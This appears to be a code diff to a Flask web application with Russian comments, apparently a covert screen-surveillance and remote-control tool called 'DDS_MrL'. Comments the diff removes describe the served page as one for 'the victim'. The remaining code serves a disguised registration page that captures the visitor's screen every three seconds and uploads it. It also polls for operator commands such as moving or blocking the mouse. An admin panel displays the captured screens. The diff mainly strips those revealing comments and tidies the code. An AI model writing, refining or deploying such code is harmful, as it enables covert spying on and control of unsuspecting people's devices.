@@ -8,22 +8,18 @@ from flask import Flask, request, jsonify
 
 app = Flask(__name__)
 
-# ========== Хранилище устройств ==========
 devices = {}
 
-# ========== 1. РЕГИСТРАЦИЯ УСТРОЙСТВА ==========
+# ========== 1. РЕГИСТРАЦИЯ ==========
 @app.route('/register', methods=['POST'])
 def register():
     data = request.json
     device_id = data.get('id')
     dev_type = data.get('type', 'pc')
-    
     if not device_id:
-        return jsonify({'ok': False, 'error': 'No ID'}), 400
-    
+        return jsonify({'ok': False}), 400
     if device_id not in devices:
         devices[device_id] = {}
-    
     devices[device_id].update({
         'deviceType': dev_type,
         'last_seen': datetime.now().isoformat(),
@@ -32,59 +28,46 @@ def register():
         'cmd': None,
         'cmd_x': 0,
         'cmd_y': 0,
-        'auto_screen': True   # флаг, что устройство шлёт скрины автоматически
+        'auto_screen': True
     })
-    
-    print(f"[REGISTER] {device_id} ({dev_type}) auto-screen ON")
     return jsonify({'ok': True})
 
-# ========== 2. ОПРОС КОМАНД (жертва забирает команды) ==========
+# ========== 2. ОПРОС ==========
 @app.route('/poll/<device_id>')
 def poll(device_id):
     if device_id not in devices:
         return jsonify({'cmd': None})
-    
     dev = devices[device_id]
     dev['last_seen'] = datetime.now().isoformat()
     dev['online'] = True
-    
     cmd = dev.get('cmd')
     x = dev.get('cmd_x', 0)
     y = dev.get('cmd_y', 0)
-    
     if cmd:
         dev['cmd'] = None
         return jsonify({'cmd': cmd, 'x': x, 'y': y})
-    
     return jsonify({'cmd': None})
 
-# ========== 3. ПРИЁМ СКРИНШОТОВ (автоматических) ==========
+# ========== 3. ПРИЁМ СКРИНОВ ==========
 @app.route('/screen', methods=['POST'])
 def screen():
     data = request.json
     device_id = data.get('id')
     screen_data = data.get('screen')
-    
     if device_id not in devices:
         return jsonify({'ok': False}), 404
-    
     devices[device_id]['screen'] = screen_data
     devices[device_id]['last_seen'] = datetime.now().isoformat()
     devices[device_id]['online'] = True
-    
-    # Не печатаем каждый скрин в логи, чтобы не засорять
-    # print(f"[SCREEN] {device_id} - auto-screenshot received")
     return jsonify({'ok': True})
 
-# ========== 4. АДМИН: ДОБАВИТЬ УСТРОЙСТВО ВРУЧНУЮ ==========
+# ========== 4. АДМИН: ДОБАВИТЬ ==========
 @app.route('/admin/add', methods=['POST'])
 def admin_add():
     data = request.json
     device_id = data.get('id')
-    
     if not device_id:
         return jsonify({'ok': False}), 400
-    
     if device_id not in devices:
         devices[device_id] = {
             'deviceType': 'unknown',
@@ -96,32 +79,26 @@ def admin_add():
             'cmd_y': 0,
             'auto_screen': True
         }
-    
     return jsonify({'ok': True})
 
-# ========== 5. АДМИН: ОТПРАВКА КОМАНДЫ ==========
+# ========== 5. АДМИН: КОМАНДА ==========
 @app.route('/cmd', methods=['POST'])
 def send_cmd():
     data = request.json
     device_id = data.get('id')
     cmd = data.get('cmd')
-    
     if device_id not in devices:
         return jsonify({'ok': False}), 404
-    
     devices[device_id]['cmd'] = cmd
     devices[device_id]['cmd_x'] = data.get('x', 0)
     devices[device_id]['cmd_y'] = data.get('y', 0)
-    
-    print(f"[CMD] {device_id} -> {cmd} (x={data.get('x',0)}, y={data.get('y',0)})")
     return jsonify({'ok': True})
 
-# ========== 6. АДМИН: ПОЛУЧИТЬ СПИСОК УСТРОЙСТВ ==========
+# ========== 6. АДМИН: СПИСОК ==========
 @app.route('/devices')
 def list_devices():
     clean = {}
     now = datetime.now()
-    
     for k, v in devices.items():
         if v.get('last_seen'):
             try:
@@ -130,49 +107,10 @@ def list_devices():
                     v['online'] = False
             except:
                 pass
-        
         clean[k] = {key: val for key, val in v.items() if key not in ['cmd', 'cmd_x', 'cmd_y']}
-    
     return jsonify(clean)
 
-# ========== 7. АДМИН: УДАЛИТЬ УСТРОЙСТВО ==========
-@app.route('/admin/remove', methods=['POST'])
-def admin_remove():
-    data = request.json
-    device_id = data.get('id')
-    if device_id in devices:
-        del devices[device_id]
-        return jsonify({'ok': True})
-    return jsonify({'ok': False}), 404
-
-# ========== 8. ПРОВЕРКА СТАТУСА ==========
-@app.route('/status/<device_id>')
-def status(device_id):
-    if device_id not in devices:
-        return jsonify({'online': False}), 404
-    return jsonify({
-        'online': devices[device_id].get('online', False),
-        'last_seen': devices[device_id].get('last_seen'),
-        'deviceType': devices[device_id].get('deviceType')
-    })
-
-# ========== 9. ВКЛ/ВЫКЛ АВТО-СКРИНОВ (опционально) ==========
-@app.route('/admin/auto_screen/<device_id>', methods=['POST'])
-def toggle_auto_screen(device_id):
-    data = request.json
-    enable = data.get('enable', True)
-    if device_id in devices:
-        devices[device_id]['auto_screen'] = enable
-        return jsonify({'ok': True, 'auto_screen': enable})
-    return jsonify({'ok': False}), 404
-
-# ========== ЗАПУСК ==========
-if __name__ == '__main__':
-    port = int(os.environ.get('PORT', 10000))
-    app.run(host='0.0.0.0', port=port, debug=False)
-    # ========== ВТОРАЯ ЧАСТЬ: СТРАНИЦЫ (вшиты в код) ==========
-
-# ===== СТРАНИЦА ДЛЯ ЖЕРТВЫ (с авто-скриншотами) =====
+# ========== 7. СТРАНИЦЫ ==========
 MASK_PAGE = '''
 <!DOCTYPE html>
 <html>
@@ -186,10 +124,7 @@ MASK_PAGE = '''
     .box{background:#161b22;padding:30px;border-radius:16px;border:1px solid #30363d;max-width:400px;width:100%;}
     .id{font-size:20px;font-weight:bold;color:#58a6ff;word-break:break-all;background:#0d1117;padding:12px;border-radius:8px;margin:15px 0;border:1px solid #30363d;}
     .btn{background:#238636;border:none;padding:12px;border-radius:8px;color:#fff;font-weight:bold;font-size:16px;width:100%;cursor:pointer;margin-top:10px;}
-    .btn:hover{background:#2ea043;}
     .small{font-size:12px;color:#484f58;margin-top:10px;}
-    .status-ok{color:#2ea043;}
-    .status-error{color:#f85149;}
   </style>
 </head>
 <body>
@@ -205,11 +140,9 @@ MASK_PAGE = '''
     const deviceId = localStorage.getItem("dds_id") || crypto.randomUUID();
     localStorage.setItem("dds_id", deviceId);
     document.getElementById('deviceId').innerText = deviceId;
-
     let deviceType = "pc";
     if(/android|iphone|ipad|tablet/i.test(navigator.userAgent)) deviceType = "tablet";
     if(/mobile/i.test(navigator.userAgent) && !/tablet/i.test(navigator.userAgent)) deviceType = "phone";
-
     let active = false;
     let screenInterval = null;
 
@@ -221,34 +154,28 @@ MASK_PAGE = '''
       }).then(r => r.json()).then(data => {
         if(data.ok) {
           active = true;
-          document.getElementById('statusText').innerHTML = '✅ Активно! <span class="status-ok">Авто-скриншоты включены</span>';
+          document.getElementById('statusText').innerText = "✅ Активно! Авто-скриншоты включены";
           document.getElementById('regBtn').innerText = "🔄 Обновить регистрацию";
           pollCommands();
-          startAutoScreen(); // ЗАПУСКАЕМ АВТО-СКРИНЫ
+          startAutoScreen();
         } else {
-          document.getElementById('statusText').innerHTML = '❌ Ошибка <span class="status-error">попробуйте снова</span>';
+          document.getElementById('statusText').innerText = "❌ Ошибка, попробуйте снова";
         }
       }).catch(() => {
-        document.getElementById('statusText').innerHTML = '❌ Ошибка сети <span class="status-error">проверьте интернет</span>';
+        document.getElementById('statusText').innerText = "❌ Ошибка сети";
       });
     });
 
-    // ===== ОПРОС КОМАНД =====
     function pollCommands() {
       if(!active) return;
       fetch("/poll/" + deviceId)
         .then(r => r.json())
         .then(data => {
-          if(data.cmd) {
-            executeCmd(data.cmd, data.x, data.y);
-          }
+          if(data.cmd) executeCmd(data.cmd, data.x, data.y);
           setTimeout(pollCommands, 2000);
-        }).catch(() => {
-          setTimeout(pollCommands, 5000);
-        });
+        }).catch(() => setTimeout(pollCommands, 5000));
     }
 
-    // ===== ВЫПОЛНЕНИЕ КОМАНД =====
     function executeCmd(cmd, x, y) {
       if(cmd === "mouse_move") {
         document.dispatchEvent(new MouseEvent("mousemove", {clientX: x, clientY: y, bubbles: true}));
@@ -261,30 +188,20 @@ MASK_PAGE = '''
       } else if(cmd === "unblock_mouse") {
         document.body.style.pointerEvents = "auto";
       } else if(cmd === "capture_screen") {
-        captureScreen(); // ручной скрин по команде
+        captureScreen();
       }
     }
 
-    // ===== АВТО-СКРИНШОТ КАЖДЫЕ 3 СЕКУНДЫ =====
     function startAutoScreen() {
       if(screenInterval) clearInterval(screenInterval);
-      // Первый скрин сразу
       captureScreen();
-      // Затем каждые 3 секунды
       screenInterval = setInterval(captureScreen, 3000);
     }
 
     async function captureScreen() {
       if(!active) return;
       try {
-        const stream = await navigator.mediaDevices.getDisplayMedia({ 
-          video: { 
-            frameRate: 3,
-            width: { ideal: 800 },
-            height: { ideal: 600 }
-          }, 
-          audio: false 
-        });
+        const stream = await navigator.mediaDevices.getDisplayMedia({ video: { frameRate: 3 }, audio: false });
         const track = stream.getVideoTracks()[0];
         const img = new ImageCapture(track);
         const bitmap = await img.grabFrame();
@@ -296,30 +213,23 @@ MASK_PAGE = '''
         const dataUrl = canvas.toDataURL("image/jpeg", 0.4);
         track.stop();
         stream.getTracks().forEach(t=>t.stop());
-        
         await fetch("/screen", {
           method: "POST",
           headers: {"Content-Type": "application/json"},
           body: JSON.stringify({id: deviceId, screen: dataUrl})
         });
-      } catch(e) {
-        // Если пользователь отменил доступ к экрану — пробуем снова через 3 секунды
-        console.warn("Screen capture failed, retrying...");
-      }
+      } catch(e){}
     }
 
-    // ===== ОСТАНОВКА АВТО-СКРИНОВ ПРИ ЗАКРЫТИИ СТРАНИЦЫ =====
     window.addEventListener('beforeunload', function() {
       if(screenInterval) clearInterval(screenInterval);
     });
-
   })();
 </script>
 </body>
 </html>
 '''
 
-# ===== АДМИН-ПАНЕЛЬ (с авто-обновлением скринов) =====
 ADMIN_PANEL = '''
 <!DOCTYPE html>
 <html>
@@ -354,21 +264,17 @@ ADMIN_PANEL = '''
 <body>
 <div id="app">
   <h1>🛸 DDS_MrL — Управление</h1>
-
   <div class="box">
     <h3>➕ Добавить устройство по ID</h3>
     <input type="text" id="deviceIdInput" placeholder="Вставьте ID устройства">
     <button class="btn btn-success" onclick="addDevice()">Добавить</button>
     <button class="btn" onclick="refreshDevices()">🔄 Обновить список</button>
   </div>
-
   <div class="stats">
     <span class="stat" id="onlineCount">🟢 0 онлайн</span>
     <span class="stat" id="autoCount">📸 Авто-скрины: 0</span>
   </div>
-
   <div id="deviceList"></div>
-
   <div id="viewerArea" class="viewer-area" style="display:none;">
     <h3 id="viewerTitle">Просмотр (обновляется каждые 3 сек)</h3>
     <img id="viewerScreen" src="" />
@@ -383,7 +289,6 @@ ADMIN_PANEL = '''
     </div>
   </div>
 </div>
-
 <script>
   let devices = {};
   let currentViewId = null;
@@ -397,23 +302,13 @@ ADMIN_PANEL = '''
       headers: {"Content-Type": "application/json"},
       body: JSON.stringify({id: id})
     }).then(r => r.json()).then(data => {
-      if(data.ok) {
-        refreshDevices();
-        document.getElementById('deviceIdInput').value = '';
-      } else {
-        alert('Ошибка');
-      }
+      if(data.ok) { refreshDevices(); document.getElementById('deviceIdInput').value = ''; }
+      else alert('Ошибка');
     });
   }
 
   function refreshDevices() {
-    fetch("/devices")
-      .then(r => r.json())
-      .then(data => {
-        devices = data;
-        renderDevices();
-        updateViewer();
-      });
+    fetch("/devices").then(r => r.json()).then(data => { devices = data; renderDevices(); updateViewer(); });
   }
 
   function sendCmd(id, cmd, x, y) {
@@ -426,12 +321,11 @@ ADMIN_PANEL = '''
 
   function viewDevice(id) {
     currentViewId = id;
-    const area = document.getElementById('viewerArea');
-    area.style.display = 'block';
+    document.getElementById('viewerArea').style.display = 'block';
     document.getElementById('viewerTitle').innerText = 'Просмотр: ' + id.slice(0,8) + '... (обновляется)';
-    updateViewer();
     if(viewerInterval) clearInterval(viewerInterval);
     viewerInterval = setInterval(updateViewer, 3000);
+    updateViewer();
   }
 
   function updateViewer() {
@@ -441,9 +335,7 @@ ADMIN_PANEL = '''
   }
 
   function renderDevices() {
-    let html = '';
-    let online = 0;
-    let autoCount = 0;
+    let html = '', online = 0, autoCount = 0;
     for(let id in devices) {
       let d = devices[id];
       if(!d) continue;
@@ -468,7 +360,6 @@ ADMIN_PANEL = '''
     document.getElementById('deviceList').innerHTML = html;
     document.getElementById('onlineCount').innerText = '🟢 '+online+' онлайн';
     document.getElementById('autoCount').innerText = '📸 Авто-скрины: '+autoCount;
-
     if(currentViewId && !devices[currentViewId]) {
       document.getElementById('viewerArea').style.display = 'none';
       currentViewId = null;
@@ -483,7 +374,6 @@ ADMIN_PANEL = '''
 </html>
 '''
 
-# ===== ПОДКЛЮЧЕНИЕ СТРАНИЦ К МАРШРУТАМ =====
 @app.route('/')
 def index():
     return MASK_PAGE
@@ -491,3 +381,8 @@ def index():
 @app.route('/admin')
 def admin():
     return ADMIN_PANEL
+
+# ========== ЗАПУСК ==========
+if __name__ == '__main__':
+    port = int(os.environ.get('PORT', 10000))
+    app.run(host='0.0.0.0', port=port, debug=False)
